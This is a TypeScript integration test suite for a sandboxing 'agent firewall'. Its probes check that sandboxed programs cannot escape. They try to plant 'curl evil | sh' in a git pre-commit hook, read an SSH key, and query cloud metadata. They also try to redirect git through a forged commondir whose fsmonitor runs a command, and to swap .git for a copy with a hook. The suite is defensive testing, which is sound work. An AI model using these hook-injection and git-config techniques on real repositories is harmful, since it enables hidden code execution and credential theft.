/**
 * v0.3 `run`: integration under the real operating-system sandbox (macOS sandbox-exec, Linux
 * bubblewrap). Small Node programs run inside it and report what they could do; the servers they
 * try to reach listen on 127.0.0.1 and the proxy reaches them through the test-only dial. Nothing
 * here changes a system setting; every path is inside the suite's temporary root. Skipped, with
 * the reason in the suite's name, where no usable sandbox exists.
 */
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { createServer as createHttpServer, type Server as HttpServer } from "node:http";
import { connect, createServer, type Server, type Socket } from "node:net";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { layout, type Layout } from "../src/runtime/layout.js";
import { tailLog, verifyLog } from "../src/runtime/log.js";
import { detectRunPlatform } from "../src/runtime/run/platform.js";
import { GIT_CONFIG_NOTICE, GIT_INIT_NOTICE, runSandboxed, type RunOptions } from "../src/runtime/run/run.js";
import { buildClientHello } from "../src/engine/tls-sni.js";
import { REPO, startCli, tempHome, testRoot } from "./helpers.js";

const sb = detectRunPlatform();
const title = sb.kind === "none" ? `run under the OS sandbox (skipped: ${sb.reason}. ${sb.hint})` : `run under the OS sandbox (${sb.detail})`;
const mac = sb.kind === "seatbelt";

let web: HttpServer;
let webPort = 0;
let echo: Server;
let echoPort = 0;
let outsideSock: Server;
let home = "";
let ws = "";
let outside = "";
let sockPath = "";
let l: Layout;

const dial = (_h: string, p: number): Promise<Socket> =>
  new Promise((res, rej) => {
    const s = connect(p === 443 ? echoPort : webPort, "127.0.0.1", () => res(s));
    s.on("error", rej);
  });

function opts(command: string[], over: Partial<RunOptions> = {}): RunOptions {
  return { layout: l, command, workspace: ws, allowWrite: [], sendHosts: [], allowLocalhost: false, allowKeychain: false, dryRun: false, verbose: false, env: { ...process.env, HOME: home }, home, cwd: ws, say: () => undefined, warn: () => undefined, capture: true, dial, ...over };
}

/** A Node program for inside the sandbox: runs the named probes and prints one JSON line. */
function probe(body: string, exitCode = 0): string[] {
  const prelude = String.raw`
const fs=require("fs"),net=require("net"),http=require("http"),dns=require("dns");
const P=new URL(process.env.HTTP_PROXY);
const r={};
const code=(f)=>{try{f();return "ok"}catch(e){return e.code||String(e)}};
const get=(url)=>new Promise(res=>{const q=http.request({host:P.hostname,port:P.port,path:url,headers:{host:new URL(url).host}},x=>{let b="";x.on("data",c=>b+=c);x.on("end",()=>res(x.statusCode+" "+b.trim()))});q.on("error",e=>res("ERR "+e.code));q.end();});
const tcp=(port,host)=>new Promise(res=>{const s=net.connect(port,host||"127.0.0.1");s.on("connect",()=>{s.destroy();res("connected")});s.on("error",e=>res(e.code));setTimeout(()=>res("timeout"),3000)});
const tunnel=(target,payload)=>new Promise(res=>{const s=net.connect(P.port,P.hostname,()=>s.write("CONNECT "+target+" HTTP/1.1\r\nHost: "+target+"\r\n\r\n"));let st="",got=0;s.on("data",c=>{if(!st){st=c.toString().split("\r\n")[0];if(st.includes(" 200 ")){s.write(Buffer.from(payload,"base64"))}else{s.destroy();res(st)}}else{got+=c.length;s.destroy();res(st+" echoed "+got)}});s.on("error",e=>res("ERR "+e.code));s.on("close",()=>res(st+" closed"));setTimeout(()=>{s.destroy();res(st+" timeout")},3000)});
(async()=>{
`;
  return [process.execPath, "-e", `${prelude}${body}\nconsole.log(JSON.stringify(r));process.exit(${exitCode});})();`];
}

const hasGit = spawnSync("git", ["--version"]).status === 0;
const gitEnv = (): NodeJS.ProcessEnv => ({ ...process.env, HOME: home, GIT_CONFIG_NOSYSTEM: "1" });

/** A new repository in the suite's root with one commit. */
function gitRepo(prefix: string): string {
  const w = mkdtempSync(join(testRoot(), prefix));
  const git = (...a: string[]): void => {
    const r = spawnSync("git", ["-C", w, ...a], { env: gitEnv() });
    if (r.status !== 0) throw new Error(`git ${a.join(" ")} failed: ${r.stderr.toString()}`);
  };
  git("init", "-q");
  git("config", "user.email", "t@example.test");
  git("config", "user.name", "t");
  git("config", "commit.gpgsign", "false");
  writeFileSync(join(w, "a.txt"), "a");
  git("add", ".");
  git("commit", "-q", "-m", "first");
  return w;
}

function parsed(stdout: string): Record<string, string> {
  const line = stdout.trim().split("\n").filter((x) => x.startsWith("{")).pop();
  if (line === undefined) throw new Error(`no JSON from the sandboxed probe: ${stdout}`);
  return JSON.parse(line) as Record<string, string>;
}

beforeAll(async () => {
  if (sb.kind === "none") return;
  home = tempHome("run-");
  l = layout(join(home, ".launchsafe-firewall"));
  mkdirSync(l.home, { recursive: true, mode: 0o700 });
  writeFileSync(l.policy, JSON.stringify({ version: 2, fetchAllowHosts: ["allowed.test"], denyHosts: ["denied.test"] }));
  mkdirSync(join(home, ".ssh"), { recursive: true });
  writeFileSync(join(home, ".ssh", "id_test"), "PRIVATE KEY");
  ws = mkdtempSync(join(testRoot(), "ws-"));
  mkdirSync(join(ws, ".git", "hooks"), { recursive: true });
  writeFileSync(join(ws, ".launchsafe-firewall.json"), JSON.stringify({ version: 2 }));
  outside = mkdtempSync(join(testRoot(), "out-"));
  web = createHttpServer((q, r) => r.end(`web ${q.headers.host} ${q.url}`));
  await new Promise<void>((r) => web.listen(0, "127.0.0.1", () => r()));
  webPort = (web.address() as { port: number }).port;
  echo = createServer((s) => {
    s.on("data", (c: Buffer) => s.write(c));
    s.on("error", () => undefined);
  });
  await new Promise<void>((r) => echo.listen(0, "127.0.0.1", () => r()));
  echoPort = (echo.address() as { port: number }).port;
  // A Unix socket outside the workspace (like tmux's or ssh-agent's): the sandbox must not reach it.
  const sd = mkdtempSync("/tmp/lsfw-o-");
  sockPath = join(sd, "o.sock");
  outsideSock = createServer((s) => s.end("outside"));
  await new Promise<void>((r) => outsideSock.listen(sockPath, () => r()));
});
afterAll(() => {
  web?.close();
  echo?.close();
  outsideSock?.close();
});

describe.skipIf(sb.kind === "none")(title, () => {
  it("network: admitted hosts through the proxy only; refused hosts get 403; no direct connection, no DNS, no outside socket", async () => {
    const hello = buildClientHello("allowed.test").toString("base64");
    const evil = buildClientHello("evil.example").toString("base64");
    const res = await runSandboxed(
      opts(
        probe(String.raw`
r.allowed=await get("http://allowed.test/x");
r.other=await get("http://other.test/x");
r.denied=await get("http://denied.test/x");
r.metadata=await get("http://169.254.169.254/latest/meta-data/");
r.tls=await tunnel("allowed.test:443","${hello}");
r.sni=await tunnel("allowed.test:443","${evil}");
r.direct=await tcp(${webPort});
r.dns=await new Promise(res=>dns.lookup("example.com",(e,a)=>res(e?e.code:"resolved "+a)));
r.sock=await new Promise(res=>{const s=net.connect("${sockPath}");s.on("data",d=>res("read "+d));s.on("error",e=>res(e.code))});
`, 3),
      ),
    );
    const r = parsed(res.stdout);
    expect(r.allowed).toBe("200 web allowed.test /x");
    expect(r.other).toMatch(/^403 LaunchSafe Agent Firewall \(run\) refused other\.test:80: other\.test is not in fetchAllowHosts/);
    expect(r.denied).toMatch(/^403 .*denyHosts/);
    expect(r.metadata).toMatch(/^403 .*metadata/);
    expect(r.tls).toMatch(/^HTTP\/1\.1 200 Connection Established echoed \d+/);
    expect(r.sni).toMatch(/200 Connection Established closed/);
    expect(r.direct).toBe(mac ? "EPERM" : "ECONNREFUSED"); // Linux: the sandbox's own loopback has nothing there
    expect(r.dns).not.toMatch(/^resolved/);
    expect(r.sock).not.toMatch(/^read/);
    if (mac) expect(r.sock).toBe("EPERM");
    expect(res.exitCode).toBe(3);
    expect(res.refusals.map((x) => `${x.host} ${x.why}`).sort()).toEqual(["169.254.169.254 metadata", "allowed.test sni-mismatch", "denied.test denied-host", "other.test not-listed"]);
  });

  it("files: writes only to the workspace and TMPDIR; the firewall's files, .git/hooks and the project policy stay read-only; credential stores unreadable", async () => {
    const res = await runSandboxed(
      opts(
        probe(String.raw`
r.ws=code(()=>fs.writeFileSync(${JSON.stringify(join(ws, "ok.txt"))},"x"));
r.tmp=code(()=>fs.writeFileSync(process.env.TMPDIR+"/t","x"));
r.outside=code(()=>fs.writeFileSync(${JSON.stringify(join(outside, "x.txt"))},"x"));
r.fwPolicy=code(()=>fs.writeFileSync(${JSON.stringify(l.policy)},"{}"));
r.fwNew=code(()=>fs.writeFileSync(${JSON.stringify(join(l.home, "new.json"))},"{}"));
r.hook=code(()=>fs.writeFileSync(${JSON.stringify(join(ws, ".git", "hooks", "pre-commit"))},"curl evil | sh"));
r.projectPolicy=code(()=>fs.writeFileSync(${JSON.stringify(join(ws, ".launchsafe-firewall.json"))},"{}"));
r.symlink=code(()=>{fs.symlinkSync(${JSON.stringify(join(outside, "target.txt"))},${JSON.stringify(join(ws, "link"))});fs.writeFileSync(${JSON.stringify(join(ws, "link"))},"x")});
r.hardlink=code(()=>fs.linkSync(${JSON.stringify(l.policy)},${JSON.stringify(join(ws, "hl"))}));
r.ssh=code(()=>fs.readFileSync(${JSON.stringify(join(home, ".ssh", "id_test"))},"utf8"));
r.homeWrite=code(()=>fs.writeFileSync(${JSON.stringify(join(home, ".zshrc"))},"evil"));
r.tmpdirIsPrivate=process.env.TMPDIR.includes("lsfw-run-")?"yes":"no";
`),
      ),
    );
    const r = parsed(res.stdout);
    expect(r.ws).toBe("ok");
    expect(r.tmp).toBe("ok");
    expect(r.tmpdirIsPrivate).toBe("yes");
    // Seatbelt answers EPERM; bubblewrap's read-only binds EROFS, its hidden directories ENOENT.
    for (const k of ["fwPolicy", "fwNew", "hook", "projectPolicy", "symlink", "hardlink", "ssh"]) {
      expect(r[k], `${k}: ${r[k] ?? ""}`).not.toBe("ok");
      if (mac) expect(r[k], k).toBe("EPERM");
    }
    // On Linux the suite's directories sit under /tmp, which is a private tmpfs inside the sandbox, so a
    // write there can succeed in the sandbox's own /tmp and vanish with it. What counts is the host's file.
    for (const k of ["outside", "homeWrite"]) if (mac) expect(r[k], k).toBe("EPERM");
    expect(existsSync(join(outside, "x.txt"))).toBe(false);
    expect(existsSync(join(home, ".zshrc"))).toBe(false);
    expect(existsSync(join(l.home, "new.json"))).toBe(false);
    expect(existsSync(join(ws, ".git", "hooks", "pre-commit"))).toBe(false);
    expect(readFileSync(l.policy, "utf8")).toContain("allowed.test");
    expect(readFileSync(join(ws, ".launchsafe-firewall.json"), "utf8")).toBe(JSON.stringify({ version: 2 }));
    expect(res.exitCode).toBe(0);
  });

  it("V3: .git and .claude cannot be renamed away (and replaced by a prepared copy with a hook); git commit still works", async () => {
    const hasGit = spawnSync("git", ["--version"]).status === 0;
    const w = mkdtempSync(join(testRoot(), "ws-mv-"));
    const git = (...a: string[]): void => {
      if (spawnSync("git", ["-C", w, ...a], { env: { ...process.env, HOME: home, GIT_CONFIG_NOSYSTEM: "1" } }).status !== 0) throw new Error(`git ${a.join(" ")} failed`);
    };
    if (hasGit) {
      git("init", "-q");
      git("config", "user.email", "t@example.test");
      git("config", "user.name", "t");
      git("config", "commit.gpgsign", "false");
    } else mkdirSync(join(w, ".git", "hooks"), { recursive: true });
    mkdirSync(join(w, ".claude"));
    // Both protected files exist, so on Linux .claude itself is not bound read-only whole: it is the self-bind that holds it.
    writeFileSync(join(w, ".claude", "settings.json"), "{}");
    writeFileSync(join(w, ".claude", "settings.local.json"), "{}");
    writeFileSync(join(w, "a.txt"), "a");
    const sh = (script: string) => runSandboxed(opts(["/bin/sh", "-c", script], { workspace: w, cwd: w }));
    const mvGit = await sh(`mv .git .git.bak && mkdir .git && cp -a .git.bak/. .git/ && printf '#!/bin/sh\ntouch ${join(outside, "pwned")}\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit`);
    expect(mvGit.exitCode, mvGit.stderr).not.toBe(0);
    expect(existsSync(join(w, ".git.bak"))).toBe(false);
    expect(existsSync(join(w, ".git", "hooks", "pre-commit"))).toBe(false);
    const mvClaude = await sh("mv .claude .claude.bak");
    expect(mvClaude.exitCode).not.toBe(0);
    expect(existsSync(join(w, ".claude.bak"))).toBe(false);
    expect(readFileSync(join(w, ".claude", "settings.json"), "utf8")).toBe("{}");
    const rmGit = await sh("rmdir .git/hooks || mv .git/hooks .git/h2");
    expect(rmGit.exitCode).not.toBe(0);
    // Writing inside them is ordinary work and still allowed.
    // RN7: skills, subagents and commands (their frontmatter can declare hooks) are not.
    const skill = await sh("mkdir -p .claude/skills/x && echo hi > .claude/skills/x/SKILL.md");
    expect(skill.exitCode).not.toBe(0);
    expect(existsSync(join(w, ".claude", "skills", "x"))).toBe(false);
    const agentFile = await sh("echo hi > .claude/agents/a.md || echo hi > .claude/commands/c.md");
    expect(agentFile.exitCode).not.toBe(0);
    // RN8: a dev container and the editor's settings are not.
    const dev = await sh("mkdir -p .devcontainer && echo '{}' > .devcontainer/devcontainer.json");
    expect(dev.exitCode).not.toBe(0);
    expect(existsSync(join(w, ".devcontainer", "devcontainer.json"))).toBe(false);
    const vs = await sh("mkdir -p .vscode; echo '{}' > .vscode/settings.json");
    expect(vs.exitCode).not.toBe(0);
    expect(existsSync(join(w, ".vscode", "settings.json"))).toBe(false);
    const inside = await sh("echo x > .claude/notes.md && echo y > .git/description");
    expect(inside.exitCode, inside.stderr).toBe(0);
    if (hasGit) {
      const commit = await sh("git add . && git commit -q -m inside && git log --oneline");
      expect(commit.exitCode, commit.stderr).toBe(0);
      expect(commit.stdout).toContain("inside");
    }
    expect(existsSync(join(outside, "pwned"))).toBe(false);
  });

  it.skipIf(!hasGit)("V4: .git/commondir cannot be created to point git at a prepared config and hooks; git works as usual without it", async () => {
    const w = gitRepo("ws-cd-");
    const pwned = join(outside, "pwned-commondir");
    const sh = (script: string) => runSandboxed(opts(["/bin/sh", "-c", script], { workspace: w, cwd: w }));
    // A prepared copy of the git directory with an fsmonitor that runs a program, then commondir pointing at it.
    const prep = `cp -R .git evil && printf '[core]\\n\\tfsmonitor = "touch ${pwned}; false"\\n' >> evil/config`;
    for (const redirect of ["printf '../evil\\n' > .git/commondir", "printf '../evil\\n' > c && mv c .git/commondir", "ln -s ../evil/commondir-target .git/commondir", "ln c2 .git/commondir"]) {
      const res = await sh(`rm -rf evil c c2; ${prep}; touch c2; ${redirect}`);
      expect(res.exitCode, redirect).not.toBe(0);
      const cd = join(w, ".git", "commondir");
      expect(existsSync(cd) ? readFileSync(cd, "utf8") : null, redirect).toBeNull();
    }
    // Ordinary git work inside the run is unaffected.
    const work = await sh("echo b > b.txt && git add b.txt && git commit -q -m second && git status --porcelain && git log --oneline && git rev-parse --git-common-dir");
    expect(work.exitCode, work.stderr).toBe(0);
    expect(work.stdout).toContain("second");
    // Outside: no commondir is left behind, git reads its own config, and nothing ran.
    expect(existsSync(join(w, ".git", "commondir"))).toBe(false);
    expect(spawnSync("git", ["-C", w, "config", "core.fsmonitor"], { env: gitEnv() }).stdout.toString()).toBe("");
    expect(spawnSync("git", ["-C", w, "status"], { env: gitEnv() }).status).toBe(0);
    expect(existsSync(pwned)).toBe(false);
  });

  it.skipIf(!hasGit)("V7: the mount points for missing protected paths are invisible to git: git add . && git commit inside the run commits only the command's own changes", async () => {
    const w = gitRepo("ws-add-");
    mkdirSync(join(w, ".claude")); // exists, without its settings files (Linux binds it read-only whole)
    const sh = (script: string) => runSandboxed(opts(["/bin/sh", "-c", script], { workspace: w, cwd: w }));
    const res = await sh("echo c > c.txt && mkdir -p src && echo d > src/d.txt && git add . && git commit -q -m agent && git show --name-only --format= HEAD && echo --- && git status --porcelain --untracked-files=all");
    expect(res.exitCode, res.stderr).toBe(0);
    const [shown, status] = res.stdout.split("---\n");
    expect((shown ?? "").trim().split("\n")).toEqual(["c.txt", "src/d.txt"]);
    expect((status ?? "").trim()).toBe("");
    if (!mac) {
      // Inside the run, the run's own mount point reads as one (its claim, by this run's id, on a path that is a
      // read-only mount point there); an empty directory the command made itself does not. The registry is
      // the layout's (as with a real install), so it is visible inside the run.
      const mod = pathToFileURL(join(REPO, "dist", "runtime", "run", "mountpoints.js")).href;
      const check = `const m = await import(${JSON.stringify(mod)}); console.log(m.runMountPoint(${JSON.stringify(join(w, ".mcp.json"))}), m.runMountPoint(${JSON.stringify(join(w, "made"))}))`;
      const env = { ...process.env, HOME: home, LAUNCHSAFE_FIREWALL_HOME: l.home };
      const inside = await runSandboxed(opts(["/bin/sh", "-c", `mkdir made && "$0" --input-type=module -e "$1"; rmdir made`, process.execPath, check], { workspace: w, cwd: w, env }));
      expect(inside.stdout.trim(), inside.stderr).toBe("true false");
    }
    const tracked = spawnSync("git", ["-C", w, "ls-files"], { env: gitEnv() }).stdout.toString().trim().split("\n");
    expect(tracked).toEqual(["a.txt", "c.txt", "src/d.txt"]);
    // Nothing is left behind in the repository.
    for (const p of [".cursor", ".codex", ".gemini", ".vscode", ".mcp.json", ".launchsafe-firewall.json", ".husky", ".git/commondir", ".git/config.worktree", ".git/modules", ".git/worktrees", ".devcontainer"]) expect(existsSync(join(w, p)), p).toBe(false);
  });

  it("a second run in the same workspace, while the first lasts, reads the policy as usual (Linux: not the first run's mount point as a broken project policy)", async () => {
    const w = mkdtempSync(join(testRoot(), "ws-two-")); // no project policy: Linux mounts a placeholder there
    const warns: string[] = [];
    // Linux: the first run is the real CLI, because a mount point reads as an absent policy only on the claim
    // of a live `dist/cli.js run` process (FA3), never on one made by this test process (a live process that
    // is not a run is no proof: run-code-paths.test.ts). It shares this process's firewall directory, so both use one registry.
    // macOS makes no mount points, so the first run stays in this process there.
    let firstErr = "";
    let first: Promise<number | null>;
    if (mac) first = runSandboxed(opts(["/bin/sh", "-c", "sleep 3"], { workspace: w, cwd: w })).then((r) => r.exitCode);
    else {
      const cli = startCli(["run", "--", "/bin/sh", "-c", "sleep 4"], { home, cwd: w, env: { LAUNCHSAFE_FIREWALL_HOME: process.env.LAUNCHSAFE_FIREWALL_HOME } });
      first = cli.done.then((r) => ((firstErr = r.stderr), r.code));
    }
    // Linux: wait for the first run's mount point.
    for (let i = 0; i < 100 && !(mac ? i >= 12 : existsSync(join(w, ".launchsafe-firewall.json"))); i++) await new Promise((r) => setTimeout(r, 100));
    if (!mac) expect(existsSync(join(w, ".launchsafe-firewall.json")), firstErr).toBe(true);
    const second = await runSandboxed(opts(probe(String.raw`r.allowed=await get("http://allowed.test/x");`), { workspace: w, cwd: w, warn: (s) => warns.push(s) }));
    expect(warns.join("\n")).not.toMatch(/policy is invalid/);
    expect(parsed(second.stdout).allowed).toBe("200 web allowed.test /x");
    expect(await first, firstErr).toBe(0);
    expect(existsSync(join(w, ".launchsafe-firewall.json"))).toBe(false);
  });

  it("two concurrent runs in a workspace with a tightening project policy both apply it", async () => {
    const w = mkdtempSync(join(testRoot(), "ws-tight-"));
    writeFileSync(join(w, ".launchsafe-firewall.json"), JSON.stringify({ version: 2, denyHosts: ["allowed.test"] }));
    const warns: string[] = [];
    const first = runSandboxed(opts(probe(String.raw`await new Promise(r=>setTimeout(r,2500)); r.allowed=await get("http://allowed.test/x");`), { workspace: w, cwd: w }));
    await new Promise((r) => setTimeout(r, 1200));
    const second = await runSandboxed(opts(probe(String.raw`r.allowed=await get("http://allowed.test/x");`), { workspace: w, cwd: w, warn: (s) => warns.push(s) }));
    expect(warns.join("\n")).not.toMatch(/policy is invalid/);
    expect(parsed(second.stdout).allowed).toMatch(/^403 .*denyHosts/);
    expect(parsed((await first).stdout).allowed).toMatch(/^403 .*denyHosts/);
  });

  it.skipIf(!hasGit)("git config and git init: refused inside the run with git's message and run's start-up notice; --git-init creates the repository first", async () => {
    const w = gitRepo("ws-cfg-");
    const warns: string[] = [];
    const cfg = await runSandboxed(opts(["/bin/sh", "-c", "git config user.email x@example.test"], { workspace: w, cwd: w, warn: (s) => warns.push(s) }));
    expect(cfg.exitCode).not.toBe(0);
    expect(cfg.stderr).toMatch(mac ? /could not write config file \S*\.git\/config: Operation not permitted/ : /could not write config file \S*\.git\/config: Device or resource busy/);
    expect(warns).toContain(GIT_CONFIG_NOTICE);
    const bare = mkdtempSync(join(testRoot(), "ws-noinit-"));
    const warns2: string[] = [];
    const init = await runSandboxed(opts(["/bin/sh", "-c", "git init -q"], { workspace: bare, cwd: bare, warn: (s) => warns2.push(s) }));
    expect(init.exitCode).not.toBe(0);
    expect(init.stderr).toMatch(mac ? /\.git: Operation not permitted/ : /Read-only file system/);
    expect(warns2).toContain(GIT_INIT_NOTICE);
    expect(existsSync(join(bare, ".git"))).toBe(false);
    const withFlag = await runSandboxed(opts(["/bin/sh", "-c", "git status --porcelain"], { workspace: bare, cwd: bare, gitInit: true }));
    expect(withFlag.exitCode, withFlag.stderr).toBe(0);
    expect(existsSync(join(bare, ".git", "HEAD"))).toBe(true);
  });

  it("processes: cannot signal processes outside the sandbox", async () => {
    const res = await runSandboxed(opts(probe(`r.kill=code(()=>process.kill(${process.pid},0));`)));
    expect(parsed(res.stdout).kill).not.toBe("ok");
  });

  it.skipIf(!mac)("macOS: --allow-localhost opens other 127.0.0.1 ports; the keychain is denied without --allow-keychain", async () => {
    const off = parsed((await runSandboxed(opts(probe(`r.direct=await tcp(${webPort});`)))).stdout);
    const on = parsed((await runSandboxed(opts(probe(`r.direct=await tcp(${webPort});`), { allowLocalhost: true }))).stdout);
    expect(off.direct).toBe("EPERM");
    expect(on.direct).toBe("connected");
    const kc = await runSandboxed(opts(["/usr/bin/security", "list-keychains"]));
    expect(kc.exitCode).not.toBe(0);
  });

  it("budgets: a tunnel that sends more than the per-host budget is closed, and the run logs it", async () => {
    writeFileSync(l.policy, JSON.stringify({ version: 2, fetchAllowHosts: ["allowed.test"], denyHosts: ["denied.test"], budgets: { untrusted: { bytesPerHost: 2048 } } }));
    try {
      const big = Buffer.concat([buildClientHello("allowed.test"), Buffer.alloc(8192, 1)]).toString("base64");
      const res = await runSandboxed(opts(probe(String.raw`r.big=await tunnel("allowed.test:443","${big}"); r.after=await tunnel("allowed.test:443","AA==");`)));
      const r = parsed(res.stdout);
      expect(r.big).toMatch(/200 Connection Established (closed|echoed \d+)/);
      expect(r.after).toBe("HTTP/1.1 403 Forbidden");
      const budget = tailLog(l, 50).filter((e) => e.event.type === "run_budget" && e.event.run === res.runId);
      expect(budget[0]?.event).toMatchObject({ host: "allowed.test", rule: "FW-BUDGET-BYTES", key: "bytes:allowed.test", limit: 2048 });
    } finally {
      writeFileSync(l.policy, JSON.stringify({ version: 2, fetchAllowHosts: ["allowed.test"], denyHosts: ["denied.test"] }));
    }
  });

  it("the signed log has the run's start, decisions and end, and verifies", async () => {
    const res = await runSandboxed(opts(probe(String.raw`r.a=await get("http://allowed.test/1");r.b=await get("http://allowed.test/2");r.c=await get("http://nope.test/");`, 5)));
    const mine = tailLog(l, 200).filter((e) => e.event.run === res.runId).map((e) => e.event);
    expect(mine[0]).toMatchObject({ type: "run_start", program: "node", args: 2, sandbox: sb.kind, workspace: expect.any(String) });
    expect(JSON.stringify(mine[0])).not.toContain("allowed.test/1"); // arguments are never logged
    expect(mine.filter((e) => e.type === "run_net" && e.verdict === "allow")).toHaveLength(1); // first per host only
    expect(mine).toContainEqual(expect.objectContaining({ type: "run_net", verdict: "deny", host: "nope.test", why: "not-listed" }));
    const end = mine[mine.length - 1];
    expect(end).toMatchObject({ type: "run_end", exit: 5, refused: 1 });
    expect((end?.hosts as { host: string; conns: number }[]).find((h) => h.host === "allowed.test")?.conns).toBe(2);
    expect(verifyLog(l).ok).toBe(true);
  });

  it("exit status: a signal is 128+n; a missing program is 127 and starts nothing", async () => {
    const sig = await runSandboxed(opts([process.execPath, "-e", "process.kill(process.pid,'SIGTERM')"]));
    expect(sig.exitCode).toBe(143);
    const missing = await runSandboxed(opts(["no-such-program-lsfw"]));
    expect(missing.exitCode).toBe(127);
  });
});
